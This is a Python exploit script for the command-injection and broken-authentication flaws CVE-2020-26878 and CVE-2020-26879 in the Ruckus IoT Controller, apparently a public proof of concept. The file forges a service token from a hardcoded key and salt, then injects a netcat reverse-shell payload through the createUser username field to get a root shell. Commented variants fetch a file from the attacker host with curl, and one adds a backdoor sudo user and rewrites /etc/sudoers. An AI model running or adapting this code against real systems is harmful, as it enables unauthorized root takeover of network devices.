#!/usr/bin/python
# -*- coding: utf-8 -*-

# Product 			: Ruckus IoT Controller (Ruckus vRIoT)
# Version			: <= 1.5.1.0.21
# Vendor 			: https://support.ruckuswireless.com/
# Vulnerability 	: Command Injection & Broken Authentication
# References 		: CVE-2020-26878 & CVE-2020-26879
# Discovered by		: Juan Manuel Fernandez
# Exploit Title 	: Ruckus IoT Controller (Ruckus vRIoT) 1.5.1.0.21 - Remote Code Execution
# Exploit Author	: Emre SUREN
# Disclosure Date	: 2020-10-26
# Tested on			: Appliance

import requests, urllib3, sys
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from colorama import Fore
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_nc(lhost, lport):
	opt = str(raw_input(Fore.YELLOW + "[?] Listening " + lhost + " " + lport + " (i.e. netcat) ? (y/n): "))
	if opt == "y":
		return True
	else:
		return False

def generatePayload(lhost, lport):
	# Payload wget: Easiest way to understand code execution
	# serve poc.txt via python3 -m http.server 9001
	#payload="; curl http://"+lhost+":"+lport+"/poc.txt;#"

	# Payload for Add a sudo user: Need to know sudo group id which is 27 and need to know contents of /etc/sudoers
	# Learn it by the "Analysis of file system"
	#payload="; useradd \"pwned\" -g 27; echo \"pwned\":\"pwned\" | chpasswd >/dev/null 2>&1; sed -i \"s/Defaults        rootpw/ /g\" /etc/sudoers;#"

	# Payload to get a shell
	payload="; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc "+lhost+" "+lport+" >/tmp/f; #"

	#NOTE: The application runs as root, since it is designed to execute administrative tasks from web UI
	# Therefore no need for priv esc, it gives a root shell

	return payload

def generateMagicToken():

	enc_dec_method = 'utf-8'
	salt = 'nplusServiceAuth'
	salt = salt.encode("utf8")
	str_key = 'serviceN1authent'
	str_to_enc = 'TlBMVVMx'

	return encrypt(enc_dec_method, salt, str_key, str_to_enc)	# Generated value is OlDkR+oocZg=

# Following code taken from enc_dec.py
def encrypt(enc_dec_method, salt, str_key, str_to_enc):

	aes_obj = AES.new(str_key, AES.MODE_CFB, salt)
	hx_enc = aes_obj.encrypt(str_to_enc.encode("utf8"))
	mret = b64encode(hx_enc).decode(enc_dec_method)

	return mret

def execCmd(rhost, rport, lhost, lport):

	payload = generatePayload(lhost, lport)
	post_data = {
	   "username": payload,
	   "password": "test"
	}
	print(Fore.BLUE + "[*] Payload\t: " + payload)

	token = generateMagicToken()
	headers = {
		"Authorization": token
	}

	rpath = "/service/v1/createUser"
	uri = 'https://' + rhost + ":" + rport + rpath

	r = requests.post(uri, json=post_data, headers=headers, verify=False)
	print(Fore.BLUE + "[*] Request sent")

	if r.status_code == 200:    
		print(Fore.GREEN + "[+] Successful. Check for the session...")
	else:
		print(Fore.RED + "[X] Failed. Check for the response...")
		print(Fore.BLUE + "[*] Response\t: " + r.text)
		sys.exit()

def main():

	if (len(sys.argv) != 5):
		print("[*] Usage: ruckus151021.py <RHOST> <RPORT> <LHOST> <LPORT>")
		print("[*] <RHOST> -> Target IP")
		print("[*] <RPORT> -> Target Port")
		print("[*] <LHOST> -> Attacker IP")
		print("[*] <LPORT> -> Attacker Port")
		print("[*] Example: python {} 192.168.2.25 443 192.168.2.3 9001".format(sys.argv[0]))
		exit(0)

	rhost = sys.argv[1]
	rport = sys.argv[2]
	lhost = sys.argv[3]
	lport = sys.argv[4]

	if not check_nc(lhost, lport):
		print(Fore.RED + "[!] Please listen at port {} to connect a reverse session !".format(lport))
	else:
		execCmd(rhost, rport, lhost, lport)

if __name__ == "__main__":
    main()

